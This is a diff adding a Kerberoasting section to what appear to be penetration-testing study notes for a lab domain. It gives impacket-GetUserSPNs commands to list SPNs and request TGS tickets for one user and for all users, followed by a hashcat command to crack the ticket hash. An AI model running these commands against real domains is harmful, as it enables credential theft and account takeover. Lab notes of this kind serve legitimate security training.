@@ -102,7 +102,53 @@ impacket-secretsdump -k -target-ip [ip] [domain name]
 
 --------------
 
-- 
+- Script-:
+
+<img width="1908" height="563" alt="image" src="https://github.com/user-attachments/assets/efb28544-eabc-4517-8c5c-0d85e0f0bbf5" />
+
+- We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket. For our purposes, we will use a password.
+- Syntax-:
+
+```bash
+impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+```
+
+<img width="1905" height="749" alt="image" src="https://github.com/user-attachments/assets/a403fa2a-8463-4744-9a3a-d326329e8314" />
+
+- Requesting a Single TGS ticket
+
+```bash
+impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+```
+
+<img width="1899" height="561" alt="image" src="https://github.com/user-attachments/assets/447270aa-9cb7-445e-b04b-c487c8f842de" />
+
+- The next step is to crack with `hashcat`.
+
+```bash
+hashcat -m 13100 kerberoasted_sqldev /usr/share/wordlists/rockyou.txt
+```
+- Saving to an ouptut file
+
+```bash
+impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile kerberoasted_sqldev
+```
+
+<img width="1905" height="396" alt="image" src="https://github.com/user-attachments/assets/4e9d65fa-7ae5-4cad-b251-35d16c8381d9" />
+
+- Cracked with John-:
+
+<img width="1100" height="259" alt="image" src="https://github.com/user-attachments/assets/edbab145-08c4-4002-b96a-64a509575a2f" />
+
+- Requesting all users
+
+```bash
+impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
+```
+
+<img width="1894" height="977" alt="image" src="https://github.com/user-attachments/assets/2447936a-0e4d-4603-b3a2-7be2e6957913" />
+
+
 
 --------------
 
